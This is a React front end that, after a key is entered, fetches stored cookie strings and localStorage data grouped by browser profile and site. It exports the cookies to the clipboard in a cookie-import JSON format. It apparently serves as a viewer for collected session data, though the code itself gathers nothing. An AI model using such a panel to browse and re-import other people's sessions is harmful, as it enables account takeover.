import {useState} from "react";
import Loading from "./loading.jsx";

function App() {
    const API_URL = import.meta.env.VITE_API_URL;

    const [code, setCode] = useState("");
    const [codeIsSet, setCodeIsSet] = useState(false);
    const [profiles, setProfiles] = useState([]);
    const [isLoading, setIsLoading] = useState(true);

    const parseCookieData = (data) => {
        if (!data) return {};
        return data.split(";").reduce((acc, current) => {
            const [key, value] = current.split("=").map(item => item?.trim());
            if (key && value) acc[key] = value;
            return acc;
        }, {});
    };

    const parseLocalData = (localDataStr) => {
        try {
            // Handle double-escaped JSON strings
            let cleanData = localDataStr.replace(/\\{2}/g, '');
            return JSON.parse(cleanData);
        } catch (error) {
            console.error("Error parsing localData:", error);
            return {};
        }
    };

    const copyToClipboard = (cookie) => {
        const formattedCookies = Object.entries(parseCookieData(cookie.data)).map(([name, value]) => ({
            domain: cookie.url,
            expirationDate: Math.floor(Date.now() / 1000) + 3600,
            httpOnly: false,
            name,
            path: "/",
            secure: true,
            value,
        }));

        const jsonString = JSON.stringify(formattedCookies, null, 2);
        navigator.clipboard.writeText(jsonString)
            .then(() => alert("Copied cookies to clipboard!"))
            .catch(err => console.error("Failed to copy:", err));
    };

    const copyLocalStorageData = (data) => {
        const jsonString = JSON.stringify(data, null, 2);
        navigator.clipboard.writeText(jsonString)
            .then(() => alert("Copied local storage data to clipboard!"))
            .catch(err => console.error("Failed to copy:", err));
    };

    const fetchCookies = async () => {
        try {
            const response = await fetch(API_URL, {
                method: "GET",
                headers: {
                    spec: code
                },
            });
            if (!response.ok) throw new Error("Failed to fetch data");

            const data = await response.json();

            // Group by profile and extract cookiesList
            const groupedByProfile = data.reduce((acc, item) => {
                const profileName = item.profile;
                if (!acc[profileName]) {
                    acc[profileName] = [];
                }
                acc[profileName].push(...item.cookiesList);
                return acc;
            }, {});

            const profilesArray = Object.entries(groupedByProfile).map(([name, cookies]) => ({
                name,
                cookies: cookies.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime()),
                expanded: false
            }));

            setProfiles(profilesArray);
        } catch (error) {
            console.error("Error fetching data:", error);
        } finally {
            setIsLoading(false);
        }
    };

    const toggleProfile = (index) => {
        setProfiles(prev =>
            prev.map((profile, i) =>
                i === index ? {...profile, expanded: !profile.expanded} : profile
            )
        );
    };

    const onSubmit = () => {
        setCodeIsSet(true);
        fetchCookies();
    };

    if (!codeIsSet) {
        return (
            <div className="flex h-[70vh] items-center justify-center">
                <div
                    className="h-[3/4] w-2/3 shadow shadow-md border border-gray-200 p-6 py-9 flex flex-col gap-y-2 rounded-md">
                    Enter Key:
                    <input
                        placeholder="key"
                        className="border rounded-md p-3"
                        onChange={(e) => setCode(e.target.value)}
                    />
                    <button
                        className="px-4 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-500 cursor-pointer"
                        onClick={onSubmit}
                    >
                        Submit
                    </button>
                </div>
            </div>
        );
    }

    return (
        <div className="p-4 bg-gray-100 min-h-screen">
            <h1 className="text-2xl font-bold text-center mb-4">Stored Cookies & Local Data</h1>

            {isLoading ? (
                <Loading/>
            ) : profiles.length > 0 ? (
                <div>
                    {profiles.map((profile, index) => (
                        <div key={profile.name} className="mb-4">
                            <button
                                className="text-lg font-semibold bg-gray-200 px-4 py-2 w-full text-left"
                                onClick={() => toggleProfile(index)}
                            >
                                {profile.name}{" "}
                                {profile.expanded ? (
                                    <span className="float-right">▲</span>
                                ) : (
                                    <span className="float-right">▼</span>
                                )}
                            </button>
                            {profile.expanded && (
                                <div className="pl-4">
                                    {profile.cookies.length > 0 ? (
                                        profile.cookies.map((cookie) => {
                                            const parsedCookies = parseCookieData(cookie.data);
                                            const localData = parseLocalData(cookie.localData);

                                            return (
                                                <div key={cookie._id}
                                                     className="bg-white shadow-lg rounded-lg p-4 mt-2">
                                                    <div className="flex items-center">
                                                        <h2 className="text-lg font-semibold">{cookie.url}</h2>
                                                        <button
                                                            onClick={() => copyToClipboard(cookie)}
                                                            className="ml-auto text-white bg-green-500 px-2 py-1 rounded hover:bg-green-600 transition"
                                                        >
                                                            Copy Cookies
                                                        </button>
                                                    </div>
                                                    <p className="text-xs text-gray-500">
                                                        Updated: {new Date(cookie.updatedAt).toLocaleString()}
                                                    </p>

                                                    {/* Display parsed cookies */}
                                                    <div className="mt-2 text-sm text-gray-700">
                                                        <h3 className="font-semibold">Cookies:</h3>
                                                        {Object.keys(parsedCookies).length > 0 ? (
                                                            <ul>
                                                                {Object.entries(parsedCookies).map(([key, value]) => (
                                                                    <li key={key} className="border-b py-1 truncate">
                                                                        <strong>{key}:</strong> {value}
                                                                    </li>
                                                                ))}
                                                            </ul>
                                                        ) : (
                                                            <p>No cookies found</p>
                                                        )}
                                                    </div>

                                                    {/* Display parsed localStorage data with copy button */}
                                                    <div className="mt-2 text-sm text-gray-700">
                                                        <div className="flex items-center">
                                                            <h3 className="font-semibold">Local Storage Data:</h3>
                                                            {Object.keys(localData).length > 0 && (
                                                                <button
                                                                    onClick={() => copyLocalStorageData(localData)}
                                                                    className="ml-auto text-white bg-blue-500 px-2 py-1 rounded hover:bg-blue-600 transition"
                                                                >
                                                                    Copy LocalStorage
                                                                </button>
                                                            )}
                                                        </div>
                                                        {Object.keys(localData).length > 0 ? (
                                                            <ul>
                                                                {Object.entries(localData).map(([key, value]) => (
                                                                    <li key={key} className="border-b py-1 truncate">
                                                                        <strong>{key}:</strong> {JSON.stringify(value)}
                                                                    </li>
                                                                ))}
                                                            </ul>
                                                        ) : (
                                                            <p>No local storage data found</p>
                                                        )}
                                                    </div>
                                                </div>
                                            );
                                        })
                                    ) : (
                                        <p className="text-center italic">No cookies found for this profile</p>
                                    )}
                                </div>
                            )}
                        </div>
                    ))}
                </div>
            ) : (
                <div className="flex h-[70vh] items-center justify-center text-2xl font-bold">
                    No profiles found
                </div>
            )}
        </div>
    );
}

export default App;